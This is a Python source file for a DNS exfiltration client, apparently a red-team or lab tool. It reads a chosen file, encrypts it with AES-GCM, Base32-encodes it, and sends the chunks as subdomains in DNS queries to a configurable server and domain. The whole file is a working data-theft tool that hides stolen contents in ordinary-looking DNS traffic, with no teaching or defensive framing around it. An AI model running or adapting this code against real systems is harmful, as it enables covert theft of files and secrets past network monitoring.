#!/usr/bin/env python3
"""
Module Name: client.py

Description: DNS exfiltration client using AES-GCM encryption + Base32 encoding.
It reads a file, encrypts its contents with AES-GCM (using EXFIL_KEY from the environment),
encodes the ciphertext in Base32 (unpadded), splits it into DNS-safe chunks, and sends each
chunk as a subdomain in a DNS A query.

Author: John Burns
Date: 2024-04-30
Version: 1.3 (AES-GCM encryption + Base32, dynamic chunk sizing)
"""

import os
import base64
import argparse
import logging
import socket
from uuid import uuid4
from dnslib import DNSRecord, DNSQuestion, QTYPE
from math import ceil
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from dotenv import load_dotenv, find_dotenv
load_dotenv(find_dotenv())

# Configure logging
logging.basicConfig(level=logging.INFO,
                    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger('client')

# Load AES-GCM key from environment (hex-encoded, 32 bytes)
EXFIL_KEY = bytes.fromhex(os.environ['EXFIL_KEY'])

def encrypt_data(raw: bytes) -> bytes:
    """
    Encrypt raw bytes with AES-GCM: returns nonce||ciphertext||tag.
    """
    aesgcm = AESGCM(EXFIL_KEY)
    nonce = os.urandom(12)
    ct = aesgcm.encrypt(nonce, raw, associated_data=None)
    return nonce + ct


def encode_file_contents_base32(file_path):
    """Read file, encrypt with AES-GCM, then return Base32-encoded (unpadded) ASCII string."""
    with open(file_path, 'rb') as f:
        raw = f.read()
    encrypted_blob = encrypt_data(raw)
    b32 = base64.b32encode(encrypted_blob).decode('ascii')
    return b32.rstrip('=')


def chunk_data(data, size):
    """Yield successive size-character chunks from data."""
    for i in range(0, len(data), size):
        yield data[i:i + size]


def make_segments(encoded_data, identifier):
    """Determine optimal chunk size and split encoded data into segments."""
    # Initial estimate for segment count
    est_chunk = 48
    est_segments = ceil(len(encoded_data) / est_chunk)
    idx_digits = len(str(est_segments - 1))
    tot_digits = len(str(est_segments))
    # Overhead: identifier + two indices + hyphens
    overhead = len(identifier) + idx_digits + tot_digits + 3
    chunk_size = 63 - overhead
    segments = list(chunk_data(encoded_data, chunk_size))
    total = len(segments)
    return segments, total, chunk_size


def send_dns_query(subdomain, args):
    """Send one DNS A query for the given subdomain."""
    fqdn = f"{subdomain}.{args.domain}"
    query = DNSRecord(q=DNSQuestion(fqdn, QTYPE.A))
    data = query.pack()
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        sock.settimeout(2)
        sock.sendto(data, (args.server_ip, args.server_port))
        response, _ = sock.recvfrom(4096)
        logger.info(f"Received response: {DNSRecord.parse(response)}")
    except socket.timeout:
        logger.warning("No response received for %s", fqdn)
    except Exception as e:
        logger.error("Error sending DNS query: %s", e)
    finally:
        sock.close()


def main():
    args = get_args()
    identifier = uuid4().hex[:8]
    encoded = encode_file_contents_base32(args.file_path)
    segments, total_segments, chunk_size = make_segments(encoded, identifier)
    logger.info("Exfiltrating %s in %d segments (chunk_size=%d)",
                args.file_path, total_segments, chunk_size)

    for i, chunk in enumerate(segments):
        logger.info("Sending segment %d/%d (len=%d)", i+1, total_segments, len(chunk))
        subdomain = f"{identifier}-{i}-{total_segments}-{chunk}"
        if len(subdomain) > 63:
            logger.error("Subdomain too long (%d chars): %s", len(subdomain), subdomain)
            continue
        send_dns_query(subdomain, args)


def get_args():
    parser = argparse.ArgumentParser(description="DNS Exfiltration Client (AES-GCM + Base32)")
    parser.add_argument("--server-ip", type=str, default="127.0.0.1",
                        help="IP address of the DNS exfil server")
    parser.add_argument("--server-port", type=int, default=5300,
                        help="UDP port of the DNS exfil server")
    parser.add_argument("--file-path", required=True,
                        help="Path to the file to exfiltrate")
    parser.add_argument("--domain", type=str,
                        default="xf.example.com",
                        help="Domain suffix for queries")
    return parser.parse_args()

if __name__ == "__main__":
    main()
